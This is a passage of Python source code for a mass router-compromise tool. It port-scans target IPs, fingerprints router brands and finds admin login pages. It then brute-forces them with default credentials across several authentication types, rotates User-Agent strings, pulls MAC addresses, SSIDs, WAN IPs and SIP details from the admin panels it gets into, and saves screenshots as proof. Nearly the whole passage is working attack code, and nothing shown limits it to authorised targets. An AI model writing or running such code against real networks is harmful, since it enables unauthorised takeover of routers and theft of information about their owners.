                                    r'inc[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    r'ltd[^>]*' + re.escape(pattern.lower()) + r'[^>]*',
                                    r'corp[^>]*' + re.escape(pattern.lower()) + r'[^>]*'
                                ]
                                
                                for copyright_pattern in copyright_patterns:
                                    if re.search(copyright_pattern, content):
                                        score += 2
                                        break
                            
                            # If we have strong indicators, return this brand
                            if score >= 4:  # Lowered threshold for better detection
                                return brand, patterns
                        
                        # If no specific brand found, return generic
                        return 'generic', BRAND_PATTERNS['generic']
                        
                except:
                    continue
            
            return 'generic', BRAND_PATTERNS['generic']
            
        except:
            return 'generic', BRAND_PATTERNS['generic']
    
    def is_false_positive(self, content, url):
        """Check if this is a false positive (VPN, Email, Social login) - more lenient"""
        content_lower = content.lower()
        url_lower = url.lower()
        
        # Check for strong false positive indicators only
        strong_fp_indicators = [
            'vpn', 'openvpn', 'wireguard', 'ipsec', 'l2tp', 'pptp', 'fortinet', 'cisco anyconnect',
            'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'tunnelbear', 'cyberghost',
            'accounts.google.com', 'login.live.com', 'facebook.com', 'twitter.com',
            'github', 'gitlab', 'bitbucket', 'slack', 'discord', 'telegram', 'whatsapp',
            'zoom', 'teams', 'skype', 'dropbox', 'onedrive', 'icloud', 'aws', 'azure'
        ]
        
        for indicator in strong_fp_indicators:
            if indicator in content_lower or indicator in url_lower:
                # Additional check: if it's a router-related page, don't filter
                router_indicators = ['router', 'gateway', 'modem', 'access point', 'wireless', 'network', 'admin', 'login']
                if any(router_indicator in content_lower for router_indicator in router_indicators):
                    continue  # Don't filter if it contains router indicators
                return True, indicator
        
        # Only check for email-based login if it's clearly not a router
        if '<input' in content_lower and 'email' in content_lower and 'password' in content_lower:
            router_indicators = ['router', 'gateway', 'modem', 'access point', 'wireless', 'network', 'admin']
            if not any(router_indicator in content_lower for router_indicator in router_indicators):
                return True, 'email-based login'
        
        return False, None
    
    def detect_authentication_type(self, url):
        """Detect authentication type for a specific URL - Enhanced for 5 types"""
        try:
            # Use random User-Agent
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            # Get the final URL after redirects
            final_url = response.url
            content = response.text.lower()
            headers_str = str(response.headers).lower()
            
            # 1. HTTP Basic/Digest Authentication (401 status) - detect BEFORE false-positive filtering
            if response.status_code == 401:
                auth_header = response.headers.get('WWW-Authenticate', '').lower()
                if 'basic' in auth_header:
                    return 'http_basic', response, final_url
                elif 'digest' in auth_header:
                    return 'http_digest', response, final_url
                else:
                    return 'http_basic', response, final_url  # Default to basic
            
            # Check for false positives afterwards
            is_fp, fp_reason = self.is_false_positive(content, url)
            if is_fp:
                return f'false_positive_{fp_reason}', response, final_url
            
            # 2. HTTP Digest Authentication (check headers)
            if 'digest' in headers_str or 'realm' in headers_str:
                return 'http_digest', response, final_url
            
            # 3. Form-Based Authentication (most common)
            form_indicators = [
                'password', 'username', 'user', 'pass', 'passwd', 'pwd', 'login', 'admin',
                'name', 'email', 'account', 'auth', 'authentication'
            ]
            
            # Check for login forms
            if '<form' in content:
                form_field_count = sum(1 for indicator in form_indicators if indicator in content)
                if form_field_count >= 1:
                    return 'form_based', response, final_url
            
            # Check for input fields that might be login forms
            if '<input' in content:
                input_field_count = sum(1 for indicator in form_indicators if indicator in content)
                if input_field_count >= 1:
                    return 'form_based', response, final_url
            
            # 4. API-Based Authentication
            if any(keyword in content for keyword in ['api', 'json', 'rest', 'ajax', 'xmlhttprequest']):
                return 'api_based', response, final_url
            
            # 5. Redirect-Based Authentication
            if response.history or 'location' in headers_str:
                return 'redirect_based', response, final_url
            
            # 6. JavaScript-Based Authentication
            if any(keyword in content for keyword in ['javascript', 'js', 'onclick', 'onload', 'document.forms']):
                return 'javascript_based', response, final_url
            
            # 7. Cookie-Based Authentication
            if any(keyword in content for keyword in ['cookie', 'session', 'token', 'csrf']):
                return 'cookie_based', response, final_url
            
            # Default: if we have content and login indicators, assume form-based
            if any(keyword in content for keyword in ['login', 'sign in', 'authentication', 'admin', 'user', 'password', 'username']):
                return 'form_based', response, final_url
            
            # If we have substantial content, consider it a potential login page
            if len(content) > 100:
                return 'form_based', response, final_url
            
            return None, response, final_url
            
        except:
            return None, None, None
    
    def test_http_basic_auth(self, ip, port, path, username, password):
        """Test HTTP Basic Authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_credentials}',
                'User-Agent': random.choice(USER_AGENTS)
            }
            
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code != 401 and response.status_code == 200 and len(response.text) > 500:
                return True, response.url
            
            return False, None
            
        except:
            return False, None
    
    def test_form_based_auth(self, ip, port, path, username, password):
        """Test form-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try different form field combinations
            form_data_variations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'passwd': password},
                {'admin': username, 'admin': password},
                {'name': username, 'pwd': password},
                {'username': username, 'password': password, 'login': 'Login'},
                {'user': username, 'pass': password, 'submit': 'Login'},
                {'username': username, 'password': password, 'action': 'login'}
            ]
            
            for form_data in form_data_variations:
                try:
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200 and len(response.text) > 1000:
                        content = response.text.lower()
                        
                        # Check for admin panel indicators
                        admin_score = sum(1 for indicator in ADMIN_INDICATORS if indicator in content)
                        
                        # Check for failure indicators
                        failure_indicators = [
                            'invalid', 'incorrect', 'failed', 'error', 'denied',
                            'wrong', 'login', 'authentication', 'access denied'
                        ]
                        failure_score = sum(1 for indicator in failure_indicators if indicator in content)
                        
                        # If admin score is higher than failure score, consider it successful
                        if admin_score > failure_score and admin_score >= 3:
                            return True, response.url
                            
                except:
                    continue
            
            return False, None
            
        except:
            return False, None
    
    def test_api_based_auth(self, ip, port, path, username, password):
        """Test API-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try JSON payload
            json_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': random.choice(USER_AGENTS)
            }
            
            response = self.session.post(url, json=json_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if 'success' in str(json_response).lower() or 'token' in str(json_response).lower():
                        return True, url
                except:
                    pass
            
            # Try form data
            form_data = {'username': username, 'password': password}
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200 and len(response.text) > 100:
                content = response.text.lower()
                if 'success' in content or 'token' in content or 'authenticated' in content:
                    return True, url
            
            return False, None
            
        except:
            return False, None
    
    def test_credentials(self, ip, port, path, username, password, auth_type):
        """Enhanced credential test for 5+ authentication types"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # 1. HTTP Basic Authentication
            if auth_type == 'http_basic':
                resp = self.session.get(url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
                # For HTTP Basic Auth, if we get 200 and content, it's likely successful
                if 200 <= resp.status_code < 400 and len(resp.text) > 20:
                    return True, resp.url
                return False, None
            
            # 2. HTTP Digest Authentication
            elif auth_type == 'http_digest':
                from requests.auth import HTTPDigestAuth
                resp = self.session.get(url, auth=HTTPDigestAuth(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
                if 200 <= resp.status_code < 400 and len(resp.text) > 30:
                    content = resp.text.lower()
                    if len(content) > 100 or not any(k in content for k in ['username', 'password', 'login', 'sign in']):
                        return True, resp.url
                return False, None
            
            # 3. Form-Based Authentication
            elif auth_type == 'form_based':
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password},
                    {"name": username, "pwd": password},
                    {"admin": username, "admin": password},
                    {"username": username, "password": password, "login": "Login"},
                    {"user": username, "pass": password, "submit": "Login"},
                    {"username": username, "password": password, "action": "login"}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
            
            # 4. API-Based Authentication
            elif auth_type == 'api_based':
                # Try JSON payload
                json_payloads = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password},
                    {"auth": {"username": username, "password": password}}
                ]
                for payload in json_payloads:
                    try:
                        r = self.session.post(url, json=payload, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                
                # Try form data as fallback
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
            
            # 5. Redirect-Based Authentication
            elif auth_type == 'redirect_based':
                # Try GET with credentials in URL or headers
                try:
                    r = self.session.get(url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
                    if 200 <= r.status_code < 400:
                        return True, r.url
                except Exception:
                    pass
                
                # Try POST as fallback
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
            
            # 6. JavaScript-Based Authentication
            elif auth_type == 'javascript_based':
                # Try form data (JavaScript might handle it)
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
            
            # 7. Cookie-Based Authentication
            elif auth_type == 'cookie_based':
                # Try form data first
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
            
            # Default: try form-based
            else:
                form_data_options = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password}
                ]
                for data in form_data_options:
                    try:
                        r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if 200 <= r.status_code < 400:
                            return True, r.url
                    except Exception:
                        continue
                return False, None
                
        except Exception:
            return False, None
    
    def verify_admin_access(self, admin_url, username, password, auth_type):
        """Robust admin verification with multi-factor scoring"""
        try:
            s = requests.Session()
            s.headers.update({
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
            })

            # Handle different authentication types for verification
            if auth_type == 'http_basic':
                resp = s.get(admin_url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
            elif auth_type == 'http_digest':
                from requests.auth import HTTPDigestAuth
                resp = s.get(admin_url, auth=HTTPDigestAuth(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
            elif auth_type == 'api_based':
                # Try JSON first, then form data
                resp = None
                json_payloads = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"auth": {"username": username, "password": password}}
                ]
                for payload in json_payloads:
                    try:
                        r = s.post(admin_url, json=payload, timeout=self.timeout, verify=False, allow_redirects=True)
                        if r is not None and r.status_code >= 200:
                            resp = r
                            break
                    except Exception:
                        continue
                
                if resp is None:
                    # Fallback to form data
                    payloads = [
                        {"username": username, "password": password},
                        {"user": username, "pass": password}
                    ]
                    for data in payloads:
                        try:
                            r = s.post(admin_url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                            if r is not None and r.status_code >= 200:
                                resp = r
                                break
                        except Exception:
                            continue
            else:
                # Form-based, redirect-based, javascript-based, cookie-based
                resp = None
                payloads = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password},
                    {"name": username, "pwd": password},
                ]
                for data in payloads:
                    try:
                        r = s.post(admin_url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if r is not None and r.status_code >= 200:
                            resp = r
                            break
                    except Exception:
                        continue
                
                if resp is None:
                    return False, {}

            if resp is None:
                return False, {}

            content = resp.text.lower()
            final_url = resp.url.lower()

            # Hard-fail negatives: common failure signals or back to login
            failure_keywords = [
                'login failed', 'incorrect username or password', 'wrong password',
                'authentication failed', 'invalid credentials', 'access denied',
                'unauthorized', 'forbidden'
            ]
            # Allow 401 here because HTTP Basic/Digest may still return 401 on first challenge;
            # verification should not fail solely due to 401 unless we're clearly back at login with failure text.
            if resp.status_code == 403:
                return False, {}
            if any(k in content for k in failure_keywords):
                return False, {}
            if any(k in final_url for k in ["login", "signin", "sign-in", "authenticate", "auth"]):
                # If final URL is clearly a login-related path, treat as failure
                return False, {}
            
            # Strict admin panel verification - prevent false positives
            criteria_met = 0
            total_criteria = 5  # 5 criteria for strict verification
            
            # Criterion 1: Successful response (status 200)
            if resp.status_code == 200:
                criteria_met += 1
            
            # Criterion 2: URL changed from login page (strong indicator)
            if not any(k in final_url for k in ["login", "sign-in", "signin", "auth", "authentication"]):
                criteria_met += 1
            
            # Criterion 3: Has admin/router indicators (at least 2 required)
            admin_indicators = ['admin', 'administrator', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem', 'wan', 'lan', 'wireless']
            admin_count = sum(1 for k in admin_indicators if k in content)
            if admin_count >= 2:  # At least 2 admin indicators
                criteria_met += 1
            
            # Criterion 4: Has router-specific information (MAC, IP, SSID, firmware, etc.)
            router_info_indicators = ['mac address', 'ip address', 'ssid', 'firmware', 'uptime', 'wan', 'lan', 'wireless', 'dhcp', 'dns', 'gateway', 'router']
            router_info_count = sum(1 for indicator in router_info_indicators if indicator in content)
            if router_info_count >= 1:  # At least 1 router-specific info item
                criteria_met += 1
            
            # Criterion 5: Not clearly a login page (negative test - strict)
            login_page_indicators = ['username', 'password', 'enter credentials', 'user login', 'admin login', 'router login', 'sign in', 'log in', 'authentication']
            login_page_score = sum(1 for indicator in login_page_indicators if indicator in content)
            if login_page_score < 1:  # No strong login indicators
                criteria_met += 1
            
            # Require at least 4 out of 5 criteria (80% success rate) for strict accuracy
            if criteria_met >= 4:
                return True, self.extract_router_info(content)
            else:
                return False, {}
                
        except Exception as e:
            return False, {}
    
    def extract_router_info(self, content):
        """Extract comprehensive router information"""
        info = {}
        
        # Extract page title
        title_patterns = [
            r'<title[^>]*>([^<]+)</title>',
            r'<title>([^<]+)</title>'
        ]
        info['page_title'] = self.extract_pattern(content, title_patterns)
        
        # Extract MAC address
        mac_patterns = [
            r'mac[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
            r'([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
            r'physical.*?address[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})'
        ]
        info['mac_address'] = self.extract_pattern(content, mac_patterns)
        
        # Extract firmware version
        firmware_patterns = [
            r'firmware[^:]*:?\s*([v\d\.\-]+)',
            r'version[^:]*:?\s*([v\d\.\-]+)',
            r'firmware.*?(\d+\.\d+\.\d+)',
            r'software[^:]*:?\s*([v\d\.\-]+)'
        ]
        info['firmware_version'] = self.extract_pattern(content, firmware_patterns)
        
        # Extract model
        model_patterns = [
            r'model[^:]*:?\s*([A-Z0-9\-_]+)',
            r'device[^:]*:?\s*([A-Z0-9\-_]+)',
            r'product[^:]*:?\s*([A-Z0-9\-_]+)',
            r'type[^:]*:?\s*([A-Z0-9\-_]+)'
        ]
        info['model'] = self.extract_pattern(content, model_patterns)
        
        # Extract WAN IP
        wan_ip_patterns = [
            r'wan.*?(\d+\.\d+\.\d+\.\d+)',
            r'external.*?(\d+\.\d+\.\d+\.\d+)',
            r'internet.*?(\d+\.\d+\.\d+\.\d+)',
            r'public.*?(\d+\.\d+\.\d+\.\d+)'
        ]
        info['wan_ip'] = self.extract_pattern(content, wan_ip_patterns)
        
        # Extract SSID
        ssid_patterns = [
            r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'wifi.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
        ]
        info['ssid'] = self.extract_pattern(content, ssid_patterns)
        
        # Extract SIP information
        sip_patterns = [
            r'sip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
            r'voip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
            r'phone[^:]*:?\s*([A-Za-z0-9@\.\-_]+)'
        ]
        info['sip_info'] = self.extract_pattern(content, sip_patterns)
        
        # Extract uptime
        uptime_patterns = [
            r'uptime[^:]*:?\s*([0-9]+[dhms\s]+)',
            r'running[^:]*:?\s*([0-9]+[dhms\s]+)',
            r'online[^:]*:?\s*([0-9]+[dhms\s]+)'
        ]
        info['uptime'] = self.extract_pattern(content, uptime_patterns)
        
        # Extract connection type
        connection_patterns = [
            r'connection[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'type[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'mode[^:]*:?\s*([A-Za-z0-9\-_]+)'
        ]
        info['connection_type'] = self.extract_pattern(content, connection_patterns)
        
        # Extract LAN IP
        lan_ip_patterns = [
            r'lan.*?(\d+\.\d+\.\d+\.\d+)',
            r'local.*?(\d+\.\d+\.\d+\.\d+)',
            r'gateway.*?(\d+\.\d+\.\d+\.\d+)',
            r'router.*?(\d+\.\d+\.\d+\.\d+)'
        ]
        info['lan_ip'] = self.extract_pattern(content, lan_ip_patterns)
        
        # Extract DNS servers
        dns_patterns = [
            r'dns[^:]*:?\s*(\d+\.\d+\.\d+\.\d+)',
            r'nameserver[^:]*:?\s*(\d+\.\d+\.\d+\.\d+)',
            r'primary.*?dns[^:]*:?\s*(\d+\.\d+\.\d+\.\d+)'
        ]
        info['dns_server'] = self.extract_pattern(content, dns_patterns)
        
        # Extract admin panel information
        admin_info_patterns = [
            r'welcome[^:]*:?\s*([^<\n]+)',
            r'dashboard[^:]*:?\s*([^<\n]+)',
            r'status[^:]*:?\s*([^<\n]+)',
            r'system[^:]*:?\s*([^<\n]+)',
            r'router[^:]*:?\s*([^<\n]+)',
            r'gateway[^:]*:?\s*([^<\n]+)'
        ]
        info['admin_info'] = self.extract_pattern(content, admin_info_patterns)
        
        # Extract device count/connected devices
        device_patterns = [
            r'connected.*?devices[^:]*:?\s*(\d+)',
            r'active.*?devices[^:]*:?\s*(\d+)',
            r'clients[^:]*:?\s*(\d+)',
            r'devices[^:]*:?\s*(\d+)'
        ]
        info['connected_devices'] = self.extract_pattern(content, device_patterns)
        
        return info
    
    def take_screenshot(self, url, username, password, auth_type, ip_address):
        """Take screenshot of admin panel for POC"""
        if not SCREENSHOT_AVAILABLE:
            return None
        
        try:
            # Setup Chrome options
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Create driver
            driver = webdriver.Chrome(options=chrome_options)
            
            try:
                # Navigate to URL
                driver.get(url)
                time.sleep(3)
                
                # Handle authentication
                if auth_type == 'http_basic':
                    # For HTTP Basic Auth, we need to include credentials in URL
                    parsed_url = urlparse(url)
                    auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
                    driver.get(auth_url)
                    time.sleep(3)
                else:
                    # For form-based auth, find and fill form
                    try:
                        # Try multiple field name combinations
                        field_combinations = [
                            ("username", "password"),
                            ("user", "pass"),
                            ("login", "passwd"),
                            ("admin", "admin"),
                            ("name", "pwd")
                        ]
                        
                        form_filled = False
                        for user_field_name, pass_field_name in field_combinations:
                            try:
                                username_field = driver.find_element(By.NAME, user_field_name)
                                password_field = driver.find_element(By.NAME, pass_field_name)
                                username_field.clear()
                                password_field.clear()
                                username_field.send_keys(username)
                                password_field.send_keys(password)
                                
                                # Try to find and click submit button
                                submit_selectors = [
                                    "//input[@type='submit']",
                                    "//button[@type='submit']",
                                    "//input[@value='Login']",
                                    "//button[contains(text(), 'Login')]",
                                    "//input[@value='Sign In']",
                                    "//button[contains(text(), 'Sign In')]",
                                    "//input[@value='Submit']",
                                    "//button[contains(text(), 'Submit')]"
                                ]
                                
                                for selector in submit_selectors:
                                    try:
                                        submit_button = driver.find_element(By.XPATH, selector)
                                        submit_button.click()
                                        form_filled = True
                                        break
                                    except:
                                        continue
                                
                                if form_filled:
                                    break
                                    
                            except:
                                continue
                        
                        # Wait for page to load after login
                        time.sleep(5)
                        
                        # Check if we're on admin panel (login successful)
                        current_url = driver.current_url.lower()
                        page_source = driver.page_source.lower()
                        
                        # Check for admin panel indicators
                        admin_indicators = ['admin', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway']
                        admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
                        
                        # Check for login page indicators
                        login_indicators = ['username', 'password', 'login', 'sign in', 'authentication']
                        login_count = sum(1 for indicator in login_indicators if indicator in page_source)
                        
                        # If we have admin indicators and few login indicators, we're in admin panel
                        if admin_count >= 1 and login_count < 2:
                            print(f"{Colors.GREEN}[+] Successfully logged in, taking screenshot of admin panel{Colors.END}")
                        else:
                            print(f"{Colors.YELLOW}[!] Login failed, taking screenshot of login page{Colors.END}")
                            return None  # Don't take screenshot if login failed
                        
                    except Exception as e:
                        print(f"{Colors.YELLOW}[!] Form filling failed: {e}{Colors.END}")
                
                # Take screenshot with IP in filename
                ip_clean = ip_address.replace('.', '_').replace(':', '_')
                screenshot_filename = f"screenshot_{ip_clean}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                driver.save_screenshot(screenshot_filename)
                
                return screenshot_filename
                
            finally:
                driver.quit()
                
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Screenshot failed: {e}{Colors.END}")
            return None
    
    def extract_pattern(self, content, patterns):
        """Extract information using regex patterns"""
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Unknown"
    
    def scan_single_target(self, ip):
        """Scan a single target with organized workflow"""
        result = {'ip': ip, 'ports': [], 'login_pages': [], 'vulnerabilities': []}
        
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] SCANNING TARGET: {ip}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Phase 1: Port scanning
            print(f"{Colors.YELLOW}[1/4] Port Scanning...{Colors.END}")
            open_ports = self.scan_ports_fast(ip)
            result['ports'] = open_ports
            
            if not open_ports:
                print(f"{Colors.RED}[!] No open ports found{Colors.END}")
                return result
            
            print(f"{Colors.GREEN}[+] Found {len(open_ports)} open ports: {open_ports}{Colors.END}")
            
            # Phase 2: Brand detection and login page discovery
            print(f"{Colors.YELLOW}[2/4] Brand Detection & Login Discovery...{Colors.END}")
            
            # Detect brand once for the target (not per port)
            brand, brand_patterns = self.detect_router_brand_advanced(ip, open_ports[0])
            print(f"{Colors.BLUE}[*] Detected brand: {brand.upper()}{Colors.END}")
            
            # Get priority paths based on brand - prioritize root path first, then brand-specific
            priority_paths = []
            # Always check root path first - most important
            priority_paths.append('/')
            # Add brand-specific paths if brand detected
            if brand != 'generic':
                priority_paths.extend(brand_patterns['paths'])
            # Add remaining common paths
            common_paths = ['/admin', '/login', '/admin.htm', '/index.html', '/cgi-bin/login', '/login.htm']
            priority_paths.extend([p for p in common_paths if p not in priority_paths])
            # Add remaining generic paths
            remaining_paths = [p for p in BRAND_PATTERNS['generic']['paths'] if p not in priority_paths]
            priority_paths.extend(remaining_paths)
            
            # Test all ports with priority paths - find all login pages and brute force each one
            vulnerability_found = False
            brute_force_attempted = False  # Track if brute force was actually attempted
            tested_urls = set()  # Track tested URLs to avoid duplicates
            all_login_pages = []  # Store all valid login pages for brute force
            
            # First pass: find all login pages
            for port in open_ports:
                if not running or vulnerability_found:
                    break
                
                for path in priority_paths:
                    if not running or vulnerability_found:
                        break
                    
                    url = f"http://{ip}:{port}{path}"
                    auth_type, response, final_url = self.detect_authentication_type(url)
                    
                    if auth_type and not auth_type.startswith('false_positive'):
                        # Use final_url if available, otherwise use original url
                        login_url = final_url if final_url else url
                        
                        # Skip if we already tested this URL
                        if login_url in tested_urls:
                            continue
                        tested_urls.add(login_url)
                        
                        print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {login_url} ({auth_type}){Colors.END}")
                        
                        login_info = {
                            'url': login_url,
                            'port': port,
                            'path': path,
                            'auth_type': auth_type,
                            'brand': brand
                        }
                        result['login_pages'].append(login_info)
                        all_login_pages.append(login_info)
                        
                        # Break after finding first valid login page per port
                        break
                    elif auth_type and auth_type.startswith('false_positive'):
                        print(f"{Colors.YELLOW}[!] False positive detected: {auth_type.replace('false_positive_', '')}{Colors.END}")
            
            # Second pass: brute force all login pages found
            if all_login_pages and not vulnerability_found:
                print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                brute_force_attempted = True  # Mark that brute force was attempted
                
                # Try each login page until we find a vulnerability
                for login_page in all_login_pages:
                    if not running or vulnerability_found:
                        break
                    
                    for username, password in TARGET_CREDENTIALS:
                        if not running or vulnerability_found:
                            break
                        
                        print(f"{Colors.CYAN}[>] Testing: {username}:{password} on {login_page['url']}{Colors.END}")
                        
                        success, admin_url = self.test_credentials(ip, login_page['port'], login_page['path'], username, password, login_page['auth_type'])
                    
                        if success:
                            # Phase 4: Admin verification & information extraction
                            verified, router_info = self.verify_admin_access(admin_url, username, password, login_page['auth_type'])
                        
                            if verified:
                                # Admin access verified - this is the key condition
                                print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                                
                                # Only print VULNERABLE messages after successful verification
                                print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                                print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                                
                                # Display extracted information
                                if router_info:
                                    print(f"{Colors.YELLOW}[4/4] Information Extraction...{Colors.END}")
                                    for key, value in router_info.items():
                                        if value and value != "Unknown":
                                            print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                                
                                # Take screenshot ONLY after admin access is verified
                                screenshot_file = None
                                screenshot_success = True  # Track screenshot success
                                
                                if self.enable_screenshot:
                                    print(f"{Colors.CYAN}[*] Taking screenshot for POC...{Colors.END}")
                                    screenshot_file = self.take_screenshot(admin_url, username, password, login_page['auth_type'], ip)
                                    if screenshot_file:
                                        print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_file}{Colors.END}")
                                    else:
                                        print(f"{Colors.YELLOW}[!] Screenshot failed - admin access not confirmed{Colors.END}")
                                        screenshot_success = False
                                
                                # Only confirm vulnerability if screenshot was successful (or screenshots disabled)
                                if screenshot_success or not self.enable_screenshot:
                                    vulnerability = {
                                        'type': 'Default Credentials',
                                        'credentials': f"{username}:{password}",
                                        'admin_url': admin_url,
                                        'auth_type': login_page['auth_type'],
                                        'router_info': router_info,
                                        'verified': True,
                                        'screenshot': screenshot_file
                                    }
                                    result['vulnerabilities'].append(vulnerability)
                                    
                                    with self.lock:
                                        stats['vulnerable_routers'] += 1
                                    
                                    vulnerability_found = True  # Stop testing other credentials
                                    break  # Exit the credential loop
                                else:
                                    print(f"{Colors.YELLOW}[-] {username}:{password} failed - admin access not confirmed{Colors.END}")
                            else:
                                print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        else:
                            print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
            
            # Only show "No valid credentials found" if brute force was attempted but no vulnerabilities were found
            if brute_force_attempted and not result['vulnerabilities']:
                print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                if result['login_pages']:
                    stats['login_pages_found'] += 1
            
            print(f"{Colors.GREEN}[+] Target {ip} scan completed{Colors.END}")
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning {ip}: {e}{Colors.END}")
            return result
    
    def run_scan(self):
        print(f"{Colors.GREEN}[+] Starting organized scan of {len(self.targets)} targets{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
